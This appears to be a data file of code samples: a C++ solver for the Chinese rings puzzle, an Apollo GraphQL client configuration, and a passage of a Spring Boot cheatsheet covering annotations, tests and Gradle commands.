name,code
"baguenaudier.cpp
","#include <cstdio>
#include <algorithm>


const int MAX_N = 20;
int n;
bool state[MAX_N];
int count_op = 0;


void print_state()
{
 for (int i = n - 1; i >= 0; i--) {
 printf(""%d"", state[i]);
    }
 printf(""\n"");
}


void flip(int c)
{
    state[c] = !state[c];
 print_state();
    count_op++;
}


void solve(int n);
void rsolve(int n);


// 111 -> 000
void solve(int n)
{
 if (n == 1) {
 flip(0);
    } else if (n == 2) {
 flip(1);
 solve(1);
    } else {
 solve(n - 2);
 flip(n - 1);
 rsolve(n - 2);
 solve(n - 1);
    }
}


// 000 -> 111
void rsolve(int n)
{
 if (n == 1) {
 flip(0);
    } else if (n == 2) {
 rsolve(1);
 flip(1);
    } else {
 rsolve(n - 1);
 solve(n - 2);
 flip(n - 1);
 rsolve(n - 2);
    }
}


int main()
{
 printf(""How many rings?\n"");
 scanf(""%d"", &n);
 std::fill_n(state, n, 1);
 printf(""Solution:\n"");
 print_state();
 solve(n);
 printf(""Steps: %d\n"", count_op);
}
"
"Client.js
","import { ApolloClient, createHttpLink } from ""@apollo/client"";
import { RetryLink } from ""@apollo/client/link/retry"";
import { setContext } from ""@apollo/client/link/context"";
import { onError } from ""@apollo/client/link/error"";
import ApolloCache from ""./Cache"";
import PromiseToObservable from ""./PromiseToObservable"";
import RefreshSession from ""./RefreshSession"";


const httpLink = createHttpLink({
 uri: process.env.NEXT_PUBLIC_APOLLO_CLIENT_HTTP_LINK_URI, // url to your graphql backend
 credentials: ""include"",
});


const serverHttpLink = createHttpLink({
 uri: process.env.APOLLO_CLIENT_HTTP_LINK_URI, // url to your graphql backend that doesn't necessary go back to the internet
 credentials: ""include"",
});




export const ServerClient = new ApolloClient({
 ssrMode: true,
 link: serverHttpLink,
 cache: ApolloCache,
 resolvers: {},
 ssrForceFetchDelay: 100,
 defaultOptions: {
 query: {
 fetchPolicy: ""network-only"",
 },
 },
 connectToDevTools:
 process.env.NEXT_PUBLIC_APOLLO_ENVIRONMENT !== ""production"",
});


const Client = new ApolloClient({
 link: httpLink,
 cache: ApolloCache,
 resolvers: {},
 connectToDevTools:
 process.env.NEXT_PUBLIC_APOLLO_ENVIRONMENT !== ""production"",
});


export default Client;
==<SEPERATOR>==
spring-boot-cheatsheet.java
// Enable component-scanning and auto-configuration with @SpringBootApplication Annotation
// It combines @Configuration + @ComponentScan + @EnableAutoConfiguration
@SpringBootApplication
public class FooApplication {
 public static void main(String[] args) {
 // Bootstrap the application
 SpringApplication.run(FooApplication.class, args);
  }
}


// @Configuration:  Marks a class as a config class using Spring's Java based configuration
// @ComponentScan:  Enables component-scanning so that web controller classes can be
//                  automatically registered as beans in the Spring application context
// @EnableAutoConfiguration: Configures the application based on the dependencies


// Build and Run the application
gradle bootRun
// OR:
gradle build
gradle -jar build/libs/readinglist-0.0.1-SNAPSHOT.jar


// Testing classes in Spring Boot
@RunWith(SpringJUnit4ClassRunner.class)
// Load context via Spring Boot
@SpringApplicationConfiguration(classes = ReadinglistApplication.class)
@WebAppConfiguration
public class ReadinglistApplicationTests {
 // Test that the context successfully loads (the method can be empty -> the test will fail if the context cannot be loaded)
 @Test
 public void contextLoads() {
  }
}


// Make the test methods transactional (here I use Spock as my Test-Framework of choice)
// After each test a rollback is triggered so that the database is in its previous state again
@SpringBootTest
@Transactional
class MySpec extends Specification {
 
 @Autowired
 MyRepository myRepo
 
 def ""Persist an entity""() {
 given:
 MyEntity entity = new MyEntity()
 
 when:
 myRepo.saveAndFlush(entity)
 
 then:
 myRepo.count() == 1
  }
 
 def ""Persist another entity""() {
 given:
 MyEntity entity = new MyEntity()
 
 when:
 myRepo.saveAndFlush(entity)
 
 then:
 myRepo.count() == 1
  }
}


// application.properties is optional
// Configure the embedded tomcat server so listen on port 8081
server.port=8081


// List all libs with its version 
gradle dependencies


// Inject the dependencies in the constructor function of a MVC Controller
// to show the dependent components of the class and to make the testing easier:
// The constructor can be called with an implementing mockup Repository for testing purposes
@Controller
@RequestMapping(""/"")
public class UserController {


 private UserRepository userRepository;


 @Autowired
 public UserController(UserRepository userRepository) {
 this.userRepository = userRepository;
  }
}


// Defining Condition that checks if the JdbcTemplate is available on the classpath
//
// Conditions are used by the auto-configuration mechanism of Spring Boot
// There are several configuration classes in the spring-boot-autoconfigure.jar
// which contribute to the configuration if specific conditions are met
public class JdbcTemplateCondition implements Condition {
 @Override
 public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
 try {
 context.getClassLoader().loadClass(""org.springframework.jdbc.core.JdbcTemplate"");
 return true;
    } catch (Exception e) {
 return false;
    }
  }
}


// Use a custom condition class to decide whether a Bean should be created or not
@Conditional(JdbcTemplateCondition.class)
public class MyService {
  ...
}


// Overriding Spring Boots auto-configuration for example the Spring Security configuration
// Therefore a specific Configuration class has to be in the classpath
// For Spring Security its the WebSecurityConfigurerAdapter.
// Spring then skips the Spring Security auto-configuration and uses the custom configuration instead.
// This class has to be extended and annotated with @Configuration so that it can be found
// by the component scan and registers it as a bean in the Spring application context.
// In addition there has to be a @EnableWebSecurity annotation for this class to enable Spring Security.


// The list with Auto Configuration classes
spring-boot-autoconfigure.jar -> spring.factories


// Generate report on application startup to the console about what configuration classes are being used
// With a VM parameter
-Ddebug


// OR in the application.properties
debug=true


// Integration test by loading Springs application context
